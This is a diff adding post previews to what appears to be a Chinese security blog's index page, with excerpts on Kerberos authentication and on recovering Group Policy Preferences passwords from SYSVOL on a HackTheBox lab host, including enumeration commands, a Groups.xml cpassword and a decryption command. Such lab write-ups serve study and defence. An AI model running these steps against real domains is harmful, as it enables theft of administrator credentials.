@@ -118,6 +118,110 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/" class="title"> 域控提权之ms14-068</a>
+    <section class="desc">
+  
+
+</section>
+    <p class="sub">Apr 25, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/" class="title">Kerberos认证学习</a>
+    <section class="desc">
+  Kerberos简介：
+
+Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）
+
+几乎每次互动，都会收到两条消息（一个用于响应，另一个则用于请求下一个服务）
+
+Kerberos非常依赖加密密钥，所有通信步骤中都用到共享密钥
+
+
+
+
+1、AS-REQClient将用户密码转换成NTLM hash，使用该hash对时间戳进行加密;然后将纯文本形式的时间戳以及身份信息[你的名称/ID、请求的服务名称/ID(这里为TGS：Ticket Granting Server)]、TGT生存期等）发送给AS
+2、AS-REPAS收到Client发送的身份信息，从KDC数据库中检索身份信息（只检查用户是否存在，而不检查用户凭据）。用户存在则生成一个随机的session key（会话密钥）[用于给Client请求TGS]    
+AS向Clinet发送两条消息：        
+消息1包含如下信息：[使用TGS SECRET KEY（同样存储在KDC数据库中）加密]—&gt;也就是使用TGS密钥加密TGT
+步骤1中用户提供的信息+TGS SESSION KEY                
+消息2包含如下信息：[使用用户密钥（也就是用户NTLM hash）加密]     
+TGS名称/ID            
+时间戳            
+TGS SESSION KEY
+TGT生存期`消息1为Client所请求的TGT，但是由于没有TGS SCRECT KEY,所以无法解密，此时TGT存储在Client凭据缓存中 消息2解密后获得TGS SESSION KEY
+3、TGS-REQ(金票攻击发生在此步骤)
+Client向TGS发送两条消息消息1：[使用TGS SESSION KEY进行加密]  
+你的名称/ID
+时间戳`消息2：[未加密消息]
+所要请求服务的名称/ID
+服务的有效生存期同时还会发送步骤2中收到的TGT。TGS收到Client信息，会先到KDC数据库中检查请求的服务是否存在
+4、   TGS-REPTGS使用TGS SECRET KEY解密得到未加密的TGT，包含TGS SESSION KEY,TGS SESSION KEY解密Client消息中的加密信息解密之后，TGS对如下信息进行检查    
+步骤3中消息1解密后得到的用户名称/ID与TGT的进行比较
+步骤3中消息1解密后得到的时间戳与TGT中的进行比较（默认为2分钟
+检查TGT是否过期
+检查TGS缓存中是否已有该用户凭据，避免重播检查无误之后，同样向客户端发送两条消息
+消息1：[生成的使用Service Secret Key加密后的TGS]—-&gt;Kerberos令牌
+消息2：[TGS Session Key加密]    
+服务名称/ID   
+时间戳    
+票据生存期    
+Service Session Key5、AP-REQ银票攻击发生在此步骤
+Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SESSION KEY加密如下消息：    
+用户名称/ID
+时间戳`该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源
+6、AP-REP启用相互认证的情况下，交换时间戳进行相互认证
+
+
+</section>
+    <p class="sub">Apr 25, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/" class="title">域内提权之滥用GGP</a>
+    <section class="desc">
+  在SYSVOL查找密码组策略首选项（GPP）中的密码
+原理：什么是GPP:
+GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途
+一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。
+该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）
+这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）
+漏洞利用：连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：
+\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml1、定位域控制器
+set l   
+nltest /DSGETDC:
+echo %logonserver%
+net time /domain
+......2、查询DC共享目录使用enumlinux或者smbmap检查共享目录：
+smbmap -H 10.10.10.100  ###列出目标用户共享列表
+---- -----------
+ADMIN$ NO ACCESS
+C$ NO ACCESS
+IPC$ NO ACCESS
+NETLOGON NO ACCESS
+replication read only   
+SYSVOL NO ACCESS
+Users NO ACCESS3、连接域共享
+smbclient //active.htb/Replication -N
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;4、解密使用gpprefdecrypt.py： 
+python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+</section>
+    <p class="sub">Apr 25, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/" class="title">JuicyPotato提权</a>
     <section class="desc">
   项目地址：https://github.com/ohpe/juicy-potato/
@@ -655,6 +759,155 @@ select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from 
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title=" 域控提权之ms14-068" alt=" 域控提权之ms14-068" href="/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title=" 域控提权之ms14-068" alt=" 域控提权之ms14-068"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt;  域控提权之ms14-068 &gt;</div>
+                            <div class="content flex1">
+                                
+  
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="Kerberos认证学习" alt="Kerberos认证学习" href="/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="Kerberos认证学习" alt="Kerberos认证学习"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; Kerberos认证学习 &gt;</div>
+                            <div class="content flex1">
+                                
+  Kerberos简介：
+
+Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）
+
+几乎每次互动，都会收到两条消息（一个用于响应，另一个则用于请求下一个服务）
+
+Kerberos非常依赖加密密钥，所有通信步骤中都用到共享密钥
+
+
+
+
+1、AS-REQClient将用户密码转换成NTLM hash，使用该hash对时间戳进行加密;然后将纯文本形式的时间戳以及身份信息[你的名称/ID、请求的服务名称/ID(这里为TGS：Ticket Granting Server)]、TGT生存期等）发送给AS
+2、AS-REPAS收到Client发送的身份信息，从KDC数据库中检索身份信息（只检查用户是否存在，而不检查用户凭据）。用户存在则生成一个随机的session key（会话密钥）[用于给Client请求TGS]    
+AS向Clinet发送两条消息：        
+消息1包含如下信息：[使用TGS SECRET KEY（同样存储在KDC数据库中）加密]—&gt;也就是使用TGS密钥加密TGT
+步骤1中用户提供的信息+TGS SESSION KEY                
+消息2包含如下信息：[使用用户密钥（也就是用户NTLM hash）加密]     
+TGS名称/ID            
+时间戳            
+TGS SESSION KEY
+TGT生存期`消息1为Client所请求的TGT，但是由于没有TGS SCRECT KEY,所以无法解密，此时TGT存储在Client凭据缓存中 消息2解密后获得TGS SESSION KEY
+3、TGS-REQ(金票攻击发生在此步骤)
+Client向TGS发送两条消息消息1：[使用TGS SESSION KEY进行加密]  
+你的名称/ID
+时间戳`消息2：[未加密消息]
+所要请求服务的名称/ID
+服务的有效生存期同时还会发送步骤2中收到的TGT。TGS收到Client信息，会先到KDC数据库中检查请求的服务是否存在
+4、   TGS-REPTGS使用TGS SECRET KEY解密得到未加密的TGT，包含TGS SESSION KEY,TGS SESSION KEY解密Client消息中的加密信息解密之后，TGS对如下信息进行检查    
+步骤3中消息1解密后得到的用户名称/ID与TGT的进行比较
+步骤3中消息1解密后得到的时间戳与TGT中的进行比较（默认为2分钟
+检查TGT是否过期
+检查TGS缓存中是否已有该用户凭据，避免重播检查无误之后，同样向客户端发送两条消息
+消息1：[生成的使用Service Secret Key加密后的TGS]—-&gt;Kerberos令牌
+消息2：[TGS Session Key加密]    
+服务名称/ID   
+时间戳    
+票据生存期    
+Service Session Key5、AP-REQ银票攻击发生在此步骤
+Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SESSION KEY加密如下消息：    
+用户名称/ID
+时间戳`该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源
+6、AP-REP启用相互认证的情况下，交换时间戳进行相互认证
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="域内提权之滥用GGP" alt="域内提权之滥用GGP" href="/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="域内提权之滥用GGP" alt="域内提权之滥用GGP"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 域内提权之滥用GGP &gt;</div>
+                            <div class="content flex1">
+                                
+  在SYSVOL查找密码组策略首选项（GPP）中的密码
+原理：什么是GPP:
+GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途
+一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。
+该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）
+这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）
+漏洞利用：连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：
+\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml1、定位域控制器
+set l   
+nltest /DSGETDC:
+echo %logonserver%
+net time /domain
+......2、查询DC共享目录使用enumlinux或者smbmap检查共享目录：
+smbmap -H 10.10.10.100  ###列出目标用户共享列表
+---- -----------
+ADMIN$ NO ACCESS
+C$ NO ACCESS
+IPC$ NO ACCESS
+NETLOGON NO ACCESS
+replication read only   
+SYSVOL NO ACCESS
+Users NO ACCESS3、连接域共享
+smbclient //active.htb/Replication -N
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;4、解密使用gpprefdecrypt.py： 
+python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="JuicyPotato提权" alt="JuicyPotato提权" href="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/"
                        class="post-item swiper-slide flex flex-v">
